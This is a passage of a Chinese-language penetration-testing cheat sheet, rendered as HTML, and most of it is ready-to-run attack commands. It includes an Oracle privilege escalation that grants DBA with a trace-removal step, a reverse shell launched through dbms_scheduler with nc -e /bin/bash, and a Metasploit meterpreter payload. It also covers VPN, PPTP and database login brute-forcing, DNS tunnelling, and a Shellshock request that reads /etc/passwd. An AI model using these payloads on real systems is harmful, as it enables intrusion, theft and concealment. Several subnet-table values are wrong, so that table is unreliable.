+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br></pre></td></tr></table></figure>
+
+<p>确认openvas  正在运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>https://127.0.0.1:9392 </code> 登陆openvas，密码是在安装时设置好的。</p>
+<h2 id="数据库渗透测试"><a href="#数据库渗透测试" class="headerlink" title="数据库渗透测试"></a>数据库渗透测试</h2><p>攻击暴露在互联网上的数据库。</p>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>安装 oscanner：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install oscanner  </span><br></pre></td></tr></table></figure>
+
+<p>运行 oscanner：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s 192.168.1.200 -P 1521 </span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle-TNS版本指纹识别"><a href="#Oracle-TNS版本指纹识别" class="headerlink" title="Oracle TNS版本指纹识别"></a>Oracle TNS版本指纹识别</h4><p>安装 tnscmd10g ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tnscmd10g</span><br></pre></td></tr></table></figure>
+
+<p>识别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g version -h TARGET</span><br><span class="line">nmap --script&#x3D;oracle-tns-version </span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破Oracle账户"><a href="#爆破Oracle账户" class="headerlink" title="爆破Oracle账户"></a>爆破Oracle账户</h4><p>验证默认账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script&#x3D;oracle-sid-brute </span><br><span class="line">nmap --script&#x3D;oracle-brute </span><br></pre></td></tr></table></figure>
+
+<p>对Oracle TNS 运行nmap脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1521 -A TARGET</span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle权限提升"><a href="#Oracle权限提升" class="headerlink" title="Oracle权限提升"></a>Oracle权限提升</h4><p>利用条件：</p>
+<ul>
+<li>Oracle必须暴露在互联网上</li>
+<li>使用默认账户，如scott</li>
+</ul>
+<p>简明流程：</p>
+<ul>
+<li>创建函数</li>
+<li>创建表 SYS.DUAL  的索引</li>
+<li>刚刚建立的索引执行了SCOTT.DBA_X 函数</li>
+<li>函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户</li>
+<li>创建具有DBA权限的账户</li>
+</ul>
+<p>下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。</p>
+<h5 id="使用NMAP-NSE脚本验证oracle数据库中的默认账户："><a href="#使用NMAP-NSE脚本验证oracle数据库中的默认账户：" class="headerlink" title="使用NMAP NSE脚本验证oracle数据库中的默认账户："></a>使用NMAP NSE脚本验证oracle数据库中的默认账户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script&#x3D;oracle-sid-brute </span><br><span class="line">nmap --script&#x3D;oracle-brute </span><br></pre></td></tr></table></figure>
+
+<p>使用脆弱账号登陆（假设你发现了一个）。</p>
+<h5 id="确认一个oracle用户的权限级别"><a href="#确认一个oracle用户的权限级别" class="headerlink" title="确认一个oracle用户的权限级别"></a>确认一个oracle用户的权限级别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from session_privs; </span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid </span><br><span class="line">curren_user is </span><br><span class="line">pragma autonomous_transaction; </span><br><span class="line">begin </span><br><span class="line">execute immediate &#39;grant dba to user1 identified by pass1&#39;;</span><br><span class="line">commit;</span><br><span class="line">return &#39;FOO&#39;;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Oracle权限提升和访问DBA"><a href="#Oracle权限提升和访问DBA" class="headerlink" title="Oracle权限提升和访问DBA"></a>Oracle权限提升和访问DBA</h5><p>运行netcat，<code>netcat -nvlp 443</code> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&#39;BAR&#39;));</span><br></pre></td></tr></table></figure>
+
+<h5 id="运行查询语句"><a href="#运行查询语句" class="headerlink" title="运行查询语句"></a>运行查询语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; Select * from session_privs; </span><br></pre></td></tr></table></figure>
+
+<p>这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。</p>
+<h5 id="移除利用痕迹："><a href="#移除利用痕迹：" class="headerlink" title="移除利用痕迹："></a>移除利用痕迹：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index exploit_1337; </span><br></pre></td></tr></table></figure>
+
+<h5 id="获取Oracle反弹shell："><a href="#获取Oracle反弹shell：" class="headerlink" title="获取Oracle反弹shell："></a>获取Oracle反弹shell：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_scheduler.create_job( job_name    &#x3D;&gt; &#39;MEH1337&#39;,job_type    &#x3D;&gt;</span><br><span class="line">    &#39;EXECUTABLE&#39;,job_action &#x3D;&gt; &#39;&#x2F;bin&#x2F;nc&#39;,number_of_arguments &#x3D;&gt; 4,start_date &#x3D;&gt;</span><br><span class="line">    SYSTIMESTAMP,enabled    &#x3D;&gt; FALSE,auto_drop &#x3D;&gt; TRUE); </span><br><span class="line">dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 1, &#39;TARGET-IP&#39;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 2, &#39;443&#39;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 3, &#39;-e&#39;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 4, &#39;&#x2F;bin&#x2F;bash&#39;);</span><br><span class="line">dbms_scheduler.enable(&#39;rev_shell&#39;); </span><br><span class="line">end; </span><br></pre></td></tr></table></figure>
+
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>枚举/发现</p>
+<p>Nmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script&#x3D;ms-sql-info 192.168.1.108 192.168.1.156</span><br></pre></td></tr></table></figure>
+
+<p>Metasploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破-MSSQL登陆"><a href="#爆破-MSSQL登陆" class="headerlink" title="爆破 MSSQL登陆"></a>爆破 MSSQL登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_enum</span><br></pre></td></tr></table></figure>
+
+<h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payload</span><br><span class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="Plink-exe-隧道"><a href="#Plink-exe-隧道" class="headerlink" title="Plink.exe 隧道"></a>Plink.exe 隧道</h3><p>PuTTY Link  隧道</p>
+<p>转发运程端口到本地地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="跳板（Pivoting）"><a href="#跳板（Pivoting）" class="headerlink" title="跳板（Pivoting）"></a>跳板（Pivoting）</h3><h4 id="SSH-跳板（ssh-Pivoting）"><a href="#SSH-跳板（ssh-Pivoting）" class="headerlink" title="SSH 跳板（ssh Pivoting）"></a>SSH 跳板（ssh Pivoting）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</span><br></pre></td></tr></table></figure>
+
+<p>需在<code> /etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p>
+<p>利用SSH跳板跨越网络</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</span><br></pre></td></tr></table></figure>
+
+<p>需在<code> /etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</span><br></pre></td></tr></table></figure>
+
+<p>在<code> /etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1011</code></p>
+<h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-指纹识别"><a href="#TTL-指纹识别" class="headerlink" title="TTL 指纹识别"></a>TTL 指纹识别</h3><table>
+<thead>
+<tr>
+<th>操作系统</th>
+<th>TTL 值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td><code>128</code></td>
+</tr>
+<tr>
+<td>Linux</td>
+<td><code>64</code></td>
+</tr>
+<tr>
+<td>Solaris</td>
+<td><code>255</code></td>
+</tr>
+<tr>
+<td>Cisco / Network</td>
+<td><code>255</code></td>
+</tr>
+</tbody></table>
+<h3 id="IPv4-速查"><a href="#IPv4-速查" class="headerlink" title="IPv4 速查"></a>IPv4 速查</h3><h4 id="各类IP的地址范围"><a href="#各类IP的地址范围" class="headerlink" title="各类IP的地址范围"></a>各类IP的地址范围</h4><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>IP 地址范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A类</td>
+<td><code>0.0.0.0 - 127.255.255.255</code></td>
+</tr>
+<tr>
+<td>B类</td>
+<td><code>128.0.0.0 - 191.255.255.255</code></td>
+</tr>
+<tr>
+<td>C类</td>
+<td><code>192.0.0.0 - 223.255.255.255</code></td>
+</tr>
+<tr>
+<td>D类</td>
+<td><code>224.0.0.0 - 239.255.255.255</code></td>
+</tr>
+<tr>
+<td>E类</td>
+<td><code>240.0.0.0 - 255.255.255.255</code></td>
+</tr>
+</tbody></table>
+<h4 id="IPv4私有地址"><a href="#IPv4私有地址" class="headerlink" title="IPv4私有地址"></a>IPv4私有地址</h4><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A类私有地址</td>
+<td><code>10.0.0.0 - 10.255.255.255</code></td>
+</tr>
+<tr>
+<td>B类私有地址</td>
+<td><code>172.16.0.0 - 172.31.255.255</code></td>
+</tr>
+<tr>
+<td>C类私有地址</td>
+<td><code>192.168.0.0 - 192.168.255.255</code></td>
+</tr>
+<tr>
+<td></td>
+<td><code>127.0.0.0 - 127.255.255.255</code></td>
+</tr>
+</tbody></table>
+<h4 id="IPv4子网速查表"><a href="#IPv4子网速查表" class="headerlink" title="IPv4子网速查表"></a>IPv4子网速查表</h4><p>和渗透测试关系不太大，但确实很有用。</p>
+<table>
+<thead>
+<tr>
+<th>CIDR</th>
+<th>十进制掩码</th>
+<th>主机数量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/31</td>
+<td><code>255.255.255.254</code></td>
+<td><code>1 Host</code></td>
+</tr>
+<tr>
+<td>/30</td>
+<td><code>255.255.255.252</code></td>
+<td><code>2 Hosts</code></td>
+</tr>
+<tr>
+<td>/29</td>
+<td><code>255.255.255.249</code></td>
+<td><code>6 Hosts</code></td>
+</tr>
+<tr>
+<td>/28</td>
+<td><code>255.255.255.240</code></td>
+<td><code>14 Hosts</code></td>
+</tr>
+<tr>
+<td>/27</td>
+<td><code>255.255.255.224</code></td>
+<td><code>30 Hosts</code></td>
+</tr>
+<tr>
+<td>/26</td>
+<td><code>255.255.255.192</code></td>
+<td><code>62 Hosts</code></td>
+</tr>
+<tr>
+<td>/25</td>
+<td><code>255.255.255.128</code></td>
+<td><code>126 Hosts</code></td>
+</tr>
+<tr>
+<td>/24</td>
+<td><code>255.255.255.0</code></td>
+<td><code>254 Hosts</code></td>
+</tr>
+<tr>
+<td>/23</td>
+<td><code>255.255.254.0</code></td>
+<td><code>512 Host</code></td>
+</tr>
+<tr>
+<td>/22</td>
+<td><code>255.255.252.0</code></td>
+<td><code>1022 Hosts</code></td>
+</tr>
+<tr>
+<td>/21</td>
+<td><code>255.255.248.0</code></td>
+<td><code>2046 Hosts</code></td>
+</tr>
+<tr>
+<td>/20</td>
+<td><code>255.255.240.0</code></td>
+<td><code>4094 Hosts</code></td>
+</tr>
+<tr>
+<td>/19</td>
+<td><code>255.255.224.0</code></td>
+<td><code>8190 Hosts</code></td>
+</tr>
+<tr>
+<td>/18</td>
+<td><code>255.255.192.0</code></td>
+<td><code>16382 Hosts</code></td>
+</tr>
+<tr>
+<td>/17</td>
+<td><code>255.255.128.0</code></td>
+<td><code>32766 Hosts</code></td>
+</tr>
+<tr>
+<td>/16</td>
+<td><code>255.255.0.0</code></td>
+<td><code>65534 Hosts</code></td>
+</tr>
+<tr>
+<td>/15</td>
+<td><code>255.254.0.0</code></td>
+<td><code>131070 Hosts</code></td>
+</tr>
+<tr>
+<td>/14</td>
+<td><code>255.252.0.0</code></td>
+<td><code>262142 Hosts</code></td>
+</tr>
+<tr>
+<td>/13</td>
+<td><code>255.248.0.0</code></td>
+<td><code>524286 Hosts</code></td>
+</tr>
+<tr>
+<td>/12</td>
+<td><code>255.240.0.0</code></td>
+<td><code>1048674 Hosts</code></td>
+</tr>
+<tr>
+<td>/11</td>
+<td><code>255.224.0.0</code></td>
+<td><code>2097150 Hosts</code></td>
+</tr>
+<tr>
+<td>/10</td>
+<td><code>255.192.0.0</code></td>
+<td><code>4194302 Hosts</code></td>
+</tr>
+<tr>
+<td>/9</td>
+<td><code>255.128.0.0</code></td>
+<td><code>8388606 Hosts</code></td>
+</tr>
+<tr>
+<td>/8</td>
+<td><code>255.0.0.0</code></td>
+<td><code>16777214 Hosts</code></td>
+</tr>
+</tbody></table>
+<h3 id="VLAN-hopping（跳跃攻击）"><a href="#VLAN-hopping（跳跃攻击）" class="headerlink" title="VLAN hopping（跳跃攻击）"></a>VLAN hopping（跳跃攻击）</h3><p>使用nccgroup 的脚本简化攻击过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;vlan-hopping.git</span><br><span class="line">chmod 700 frogger.sh</span><br><span class="line">.&#x2F;frogger.sh </span><br></pre></td></tr></table></figure>
+
+<h3 id="VPN测试工具"><a href="#VPN测试工具" class="headerlink" title="VPN测试工具"></a>VPN测试工具</h3><p>识别VPN服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;udp-protocol-scanner.pl -p ike TARGET(s)</span><br></pre></td></tr></table></figure>
+
+<p>扫描VPN服务器网段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;udp-protocol-scanner.pl -p ike -f ip.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>使用IKEForce枚举或对 VPN 服务器进行字典攻击.</p>
+<p>安装:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyip</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ikeforce.git</span><br></pre></td></tr></table></figure>
+
+<p>使用IKEForce对IKE VPN 进行枚举：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ikeforce.py TARGET-IP –e –w wordlists&#x2F;groupnames.dic</span><br></pre></td></tr></table></figure>
+
+<p>使用 IKEForce 爆破 IKE VPN:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ike-scan</span><br><span class="line">ike-scan TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP --id&#x3D;myid -P TARGET-IP-key</span><br></pre></td></tr></table></figure>
+
+<h4 id="IKE-激进模式-PSK-破解"><a href="#IKE-激进模式-PSK-破解" class="headerlink" title="IKE 激进模式 PSK 破解"></a>IKE 激进模式 PSK 破解</h4><ol>
+<li>验证VPN服务器</li>
+<li>使用 IKEForce 枚举来获得组ID</li>
+<li>使用 ike-scan 从IKE 终端抓取 PSK 哈希 </li>
+<li>使用 psk-crack 破解哈希</li>
+</ol>
+<h5 id="Step-1-验证IKE服务器"><a href="#Step-1-验证IKE服务器" class="headerlink" title="Step 1: 验证IKE服务器"></a>Step 1: 验证IKE服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;udp-protocol-scanner.pl -p ike SUBNET&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h5 id="Step-2-使用IKEForce枚举组名"><a href="#Step-2-使用IKEForce枚举组名" class="headerlink" title="Step 2:使用IKEForce枚举组名"></a>Step 2:使用IKEForce枚举组名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ikeforce.py TARGET-IP –e –w wordlists&#x2F;groupnames.dic</span><br></pre></td></tr></table></figure>
+
+<h5 id="Step-3-使用ike-scan抓取PSK哈希"><a href="#Step-3-使用ike-scan抓取PSK哈希" class="headerlink" title="Step 3: 使用ike-scan抓取PSK哈希"></a>Step 3: 使用ike-scan抓取PSK哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP</span><br></pre></td></tr></table></figure>
+
+<h5 id="Step-4-使用psk-crack-破解PSK-哈希"><a href="#Step-4-使用psk-crack-破解PSK-哈希" class="headerlink" title="Step 4: 使用psk-crack 破解PSK 哈希"></a>Step 4: 使用psk-crack 破解PSK 哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psk-crack hash-file.txt</span><br></pre></td></tr></table></figure>
+
+<p>高级psk-crack 选项:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pskcrack</span><br><span class="line">psk-crack -b 5 TARGET-IPkey</span><br><span class="line">psk-crack -b 5 --charset&#x3D;&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</span><br><span class="line">psk-crack -d &#x2F;path&#x2F;to&#x2F;dictionary-file TARGET-IP-key</span><br></pre></td></tr></table></figure>
+
+<h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>验证PPTP服务 ，它以TCP协议在1723端口监听</p>
+<h5 id="NMAP-PPTP-指纹识别"><a href="#NMAP-PPTP-指纹识别" class="headerlink" title="NMAP PPTP 指纹识别:"></a>NMAP PPTP 指纹识别:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –Pn -sV -p 1723 TARGET(S)</span><br></pre></td></tr></table></figure>
+
+<h5 id="PPTP字典攻击"><a href="#PPTP字典攻击" class="headerlink" title="PPTP字典攻击"></a>PPTP字典攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thc-pptp-bruter -u hansolo -W -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;nmap.lst</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。</p>
+<h4 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h4><p>安装:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y install ruby-dev git make g++</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+<p>运行dnscat2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby .&#x2F;dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 1422</span><br><span class="line">dnscat2&gt; session -i 1422</span><br></pre></td></tr></table></figure>
+
+<p>目标机器:</p>
+<p><a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell/">https://github.com/lukebaggett/dnscat2-powershell/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-搜索"><a href="#Exploit-搜索" class="headerlink" title="Exploit 搜索"></a>Exploit 搜索</h2><p>寻找枚举主机/服务的exp</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`searchsploit windows 2003</td>
+<td>grep -i local`</td>
+</tr>
+<tr>
+<td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td>
+<td>使用Google搜索exploit-db.com</td>
+</tr>
+<tr>
+<td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework/modules/exploit/windows/*</code></td>
+<td>用grep搜索metasploit的模块——因为msf的搜索有点差劲。</td>
+</tr>
+</tbody></table>
+<h3 id="搜索EXP"><a href="#搜索EXP" class="headerlink" title="搜索EXP"></a>搜索EXP</h3><p>安装exploit-db的本地备份:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit –u</span><br><span class="line">searchsploit apache 2.2</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</span><br></pre></td></tr></table></figure>
+
+<h3 id="在Kali上编译WIndows的exp"><a href="#在Kali上编译WIndows的exp" class="headerlink" title="在Kali上编译WIndows的exp"></a>在Kali上编译WIndows的exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;mingw&#x2F;files&#x2F;Installer&#x2F;mingw-get-setup.exe&#x2F;download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd &#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;windows</span><br><span class="line">wget http:&#x2F;&#x2F;gojhonny.com&#x2F;misc&#x2F;mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd &#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;MinGW&#x2F;bin</span><br><span class="line">wine gcc -o ability.exe &#x2F;tmp&#x2F;exploit.c -lwsock32</span><br><span class="line">wine ability.exe  </span><br></pre></td></tr></table></figure>
+
+<h3 id="交叉编译Exploits"><a href="#交叉编译Exploits" class="headerlink" title="交叉编译Exploits"></a>交叉编译Exploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 bit)</span><br><span class="line">gcc -m64 -o output hello.c (64 bit)</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用通用漏洞"><a href="#利用通用漏洞" class="headerlink" title="利用通用漏洞"></a>利用通用漏洞</h3><h4 id="利用Shellshock漏洞"><a href="#利用Shellshock漏洞" class="headerlink" title="利用Shellshock漏洞"></a>利用Shellshock漏洞</h4><p>一个用来寻找和利用Shellshock漏洞的攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;shocker</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shocker.py -H TARGET  --command &quot;&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd&quot; -c &#x2F;cgi-bin&#x2F;status --verbose</span><br></pre></td></tr></table></figure>
+
+<h5 id="cat-file-查看文件内容"><a href="#cat-file-查看文件内容" class="headerlink" title="cat file (查看文件内容)"></a>cat file (查看文件内容)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD &#x2F;cgi-bin&#x2F;status HTTP&#x2F;1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;&#x2F;etc&#x2F;passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure>
+
